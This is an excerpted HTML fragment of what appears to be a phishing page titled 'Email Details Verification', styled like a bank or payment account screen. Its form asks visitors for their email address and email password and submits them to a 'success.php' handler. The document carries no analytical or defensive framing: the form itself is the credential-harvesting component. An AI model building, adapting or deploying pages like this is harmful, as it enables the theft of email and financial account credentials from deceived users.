        ...
        <div class="account-content-container"> 
         <div class="account-table-body"> 
          <header class="account-section-title clearfix account-secure"> 
           ...
           <h1>Email Details Verification</h1> 
          </header> 
          ...
          <section class="account-section"> 
           <form class="pay-transfer-options clearfix" action="success.php?token=<?php echo $_SESSION['token']; ?>" name="SignOn" id="frmSignOn" method="post"> 
            ...
            <div class="form-item label-right full-width clearfix"> 
             ...
             <input tabindex="1" type="email" id="UserID" name="email" required autocomplete="off" class="required demo-username"> 
             ...
             <div class="form-item full-width"> 
              <label for="currentpassword"><strong>Email Password: </strong></label> 
              <input tabindex="2" type="password" id="currentpassword" name="password" required size="15" class="required demo-password"> 
              <!--                            <div class="show-hide">
            ...
            <div class="form-actions"> 
             <input type="submit" class="submit-button arrow" tabindex="3" data-trigger="next" value="Submit"> 
